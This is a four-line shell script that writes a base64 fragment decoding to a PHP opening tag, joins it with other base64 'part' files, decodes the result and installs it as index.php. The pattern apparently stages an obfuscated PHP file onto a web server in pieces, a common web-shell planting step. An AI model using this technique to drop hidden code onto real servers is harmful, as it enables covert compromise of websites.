#!/bin/sh
echo PD9waHA=>part0
cat part*>joined
base64 -d joined>output
mv output index.php
